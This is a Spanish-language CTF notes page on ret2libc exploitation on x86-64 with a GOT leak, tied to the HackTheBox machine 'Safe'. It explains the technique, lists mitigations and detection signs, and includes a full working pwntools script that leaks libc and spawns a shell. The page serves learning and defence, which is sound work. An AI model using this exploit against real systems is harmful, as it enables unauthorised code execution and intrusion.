---
topic: ret2libc — x86-64 con fuga de GOT
tags: [pwn, ret2libc, x86-64, rop, aslr, safe]
---

# ret2libc — x86-64 con fuga de GOT

[🌐 English](ret2libc-64bit.en.md) | **Español**

## Concepto

Cuando un binario tiene NX pero no PIE, se puede reutilizar código de la libc. En x86-64 los argumentos van en registros (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`), así que hace falta un gadget `pop rdi; ret` para llamar a `puts` o `system`. Primero se filtra la dirección real de una función de libc desde la GOT, se calcula la base y se lanza una segunda fase con `system("/bin/sh")`.

## Cuándo aplica

- Desbordamiento de pila con control de `RIP`.
- NX activo, sin canary o con canary filtrado.
- Binario no PIE con PLT/GOT utilizables.
- ASLR activo: la libc cambia de base en cada ejecución.
- En Safe, `gets` con offset 120 y una libc proporcionada.

## Procedimiento

1. Calcular el offset hasta `RIP`.
2. Encontrar `pop rdi; ret`.
3. Construir la fase 1: `padding + pop rdi + puts@got + puts@plt + main`.
4. Leer la dirección filtrada y restar el offset de `puts` en la libc.
5. Construir la fase 2: `padding + ret + pop rdi + binsh + system`.

## Comandos

```python
from pwn import *

elf = ELF('./safe')
libc = ELF('./libc.so.6')
p = process('./safe')

pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
ret = ROP(elf).find_gadget(['ret'])[0]
offset = 120

payload = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendline(payload)
p.recvuntil(b'\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

payload = b'A' * offset
payload += p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
p.sendline(payload)
p.interactive()
```

## Variantes

- Filtrar `read@got` o `printf@got` si `puts` no sirve.
- Usar `one_gadget` con las restricciones de registros y pila.
- Si hay PIE, filtrar primero una dirección del binario y recalcular su base.
- Con canary, filtrarlo con un format string o un leak parcial.

## Limitaciones

- El offset de libc debe coincidir exactamente con la versión del objetivo.
- La alineación de la pila puede exigir un `ret` extra antes de `system`.
- Un `\x00` o un salto de línea en el payload puede truncarlo.
- Si la función de fuga no termina en `\n`, hay que ajustar la lectura.

## Mitigación

- Compilar con `-fstack-protector-strong`, `-pie`, `-fPIE` y `-D_FORTIFY_SOURCE=2`.
- Activar NX y ASLR; usar `RELRO` completo.
- Evitar `gets`, `strcpy` y funciones sin límites.
- Aplicar `seccomp` si el binario no necesita `execve`.

## Detección

- Caídas con `RIP` controlado y cadenas de direcciones en la pila.
- Uso de `pop rdi; ret` y llamadas a `puts@plt` desde entradas de usuario.
- Procesos que abren una shell tras una entrada anómala.
- Core dumps con patrones cíclicos.

## Referencias

- [OWASP — Return-to-libc](https://owasp.org/www-community/attacks/Return-to-libc_attack)
- [pwntools — ROP](https://docs.pwntools.com/en/stable/rop/rop.html)
- [0xdf — Safe](https://0xdf.gitlab.io/2020/01/18/htb-safe.html)
- [Ficha Safe](../../machines/linux/safe/README.md)
